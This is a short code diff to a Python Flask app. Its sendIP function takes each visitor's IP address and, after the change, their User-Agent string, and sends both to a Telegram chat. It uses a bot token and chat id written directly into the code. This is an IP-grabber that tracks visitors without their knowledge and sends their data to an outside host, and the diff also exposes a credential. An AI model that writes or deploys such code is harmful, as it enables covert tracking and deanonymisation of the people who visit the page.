@@ -11,13 +11,14 @@ bot_token="5646928081:AAHgBsRYYNmoSvO5ze3nc4R0AeFY5D8i-cU"
 chat_id="5176155219"
 
 def sendIP(request):
+    uadata=request.headers.get('User-Agent')
     if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
         ip= request.environ['REMOTE_ADDR']
-        requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=Got IP {ip}")
+        requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=Got IP {ip}\nUser Agent {uadata}")
 
     else:
         ip=request.environ['HTTP_X_FORWARDED_FOR']
-        requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=Got IP {ip}")
+        requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=Got IP {ip}\n User Agent {uadata}")
 
 @app.route("/")
 def home():
